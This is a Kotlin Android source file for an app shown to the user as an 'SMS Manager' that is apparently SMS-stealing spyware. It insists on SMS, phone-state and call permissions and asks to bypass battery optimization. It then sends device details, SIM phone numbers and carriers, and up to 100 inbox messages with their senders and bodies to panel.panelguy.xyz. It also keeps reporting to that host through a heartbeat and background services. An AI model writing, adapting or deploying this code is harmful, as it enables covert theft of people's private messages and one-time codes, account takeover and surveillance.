package com.example.test

import android.Manifest
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.URL

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val url = Constants.BASE_URL
    private val userId = Constants.USER_ID

    private val batteryUpdater = object : Runnable {
        override fun run() {
            sendBatteryUpdate()
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            askIgnoreBatteryOptimizations()
        } else {
            Toast.makeText(this, "Permissions are required", Toast.LENGTH_SHORT).show()
            requestAllPermissions()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text(
                                text = "SMS Manager",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.Black
                            )
                            Spacer(modifier = Modifier.height(16.dp))
                            Text(
                                text = "Service Running",
                                fontSize = 16.sp,
                                color = Color.Gray
                            )
                        }
                    }
                }
            }
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        )

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            askIgnoreBatteryOptimizations()
        } else {
            permissionLauncher.launch(permissions)
        }
    }

    private fun askIgnoreBatteryOptimizations() {
        Log.d("MainActivity", "════════════════════════════════════════")
        Log.d("MainActivity", "🔋 CHECKING BATTERY OPTIMIZATION")
        Log.d("MainActivity", "════════════════════════════════════════")

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.w("MainActivity", "⚠️ Battery optimization is ON, requesting to ignore...")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } else {
            Log.d("MainActivity", "✅ Battery optimization already ignored")
            continueInitialization()
        }
    }

    private fun continueInitialization() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                fcmToken = task.result
                Log.d("MainActivity", "FCM Token: $fcmToken")

                Thread {
                    try {
                        registerDevice()
                        uploadAllSmsOnce()
                        startBackgroundService()
                        startHeartbeatService()
                    } catch (e: Exception) {
                        Log.e("MainActivity", "Init error", e)
                    }
                }.start()

                handler.post(batteryUpdater)
            } else {
                Log.w("MainActivity", "FCM token failed", task.exception)
            }
        }
    }

    private fun sendBatteryUpdate() {
        if (fcmToken.isEmpty()) return

        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", getBatteryPercentage())
                    put("isOnline", true)
                }

                val url = URL("https://panel.panelguy.xyz/devices/battery-update")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                Log.d("MainActivity", "Battery update: ${conn.responseCode}")
            } catch (e: Exception) {
                Log.e("MainActivity", "Battery update error", e)
            }
        }.start()
    }

    private fun getBatteryPercentage(): Int {
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, ifilter)

        val level = batteryStatus?.getIntExtra("level", -1) ?: -1
        val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1

        return if (level != -1 && scale != -1) {
            ((level / scale.toFloat()) * 100).toInt()
        } else -1
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "Unknown"
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return "Unknown"
    }

    private fun getSimInfo(): JSONArray {
        val simArray = JSONArray()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) {
            return simArray
        }

        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val sims = subManager.activeSubscriptionInfoList

            sims?.forEach { info ->
                val sim = JSONObject().apply {
                    put("simSlot", info.simSlotIndex)
                    put("carrierName", info.carrierName.toString())
                    put("displayName", info.displayName.toString())
                    put("phoneNumber", info.number ?: "Unknown")
                }
                simArray.put(sim)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "SIM Info Error", e)
        }

        return simArray
    }

    private fun registerDevice() {
        if (fcmToken.isEmpty()) return

        try {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("IP_ADDRESS", getIPAddress())
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceModel", Build.MODEL)
                put("CPU_ARCHITECTURE", Build.SUPPORTED_ABIS[0])
                put("SDK_INT", Build.VERSION.SDK_INT)
                put("ANDROID_VERSION", Build.VERSION.RELEASE)
                put("battery", getBatteryPercentage())
                put("fcmToken", fcmToken)
                put("simInfo", getSimInfo())
                put("userId", userId)
                put("Type", "MP")
            }

            val url = URL("https://panel.panelguy.xyz/devices/register")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray())
                os.flush()
            }

            Log.d("MainActivity", "Device register: ${conn.responseCode}")
        } catch (e: Exception) {
            Log.e("MainActivity", "Register error", e)
        }
    }

    private fun uploadAllSmsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            val smsUri = Uri.parse("content://sms/inbox")
            val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")

            cursor?.use {
                if (it.moveToFirst()) {
                    val smsBatch = JSONArray()

                    do {
                        val sms = JSONObject().apply {
                            put("id", it.getString(it.getColumnIndexOrThrow("_id")))
                            put("address", it.getString(it.getColumnIndexOrThrow("address")))
                            put("body", it.getString(it.getColumnIndexOrThrow("body")))
                            put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                            put("type", "incoming")
                            put("deviceId", deviceId)
                        }
                        smsBatch.put(sms)

                        if (smsBatch.length() >= 200) {
                            if (!uploadSmsBatch(smsBatch)) break
                            smsBatch.length()
                        }
                    } while (it.moveToNext())

                    if (smsBatch.length() > 0) {
                        uploadSmsBatch(smsBatch)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "SMS upload error", e)
        }
    }

    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
        return try {
            val body = JSONObject().apply {
                put("messages", smsArray)
            }

            val url = URL("https://panel.panelguy.xyz/sms/bulk")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            Log.d("MainActivity", "SMS upload: $responseCode")

            responseCode in 200..299
        } catch (e: Exception) {
            Log.e("MainActivity", "SMS batch error", e)
            false
        }
    }

    private fun startBackgroundService() {
        val intent = Intent(this, SmsService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun startHeartbeatService() {
        val intent = Intent(this, HeartbeatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
    }
}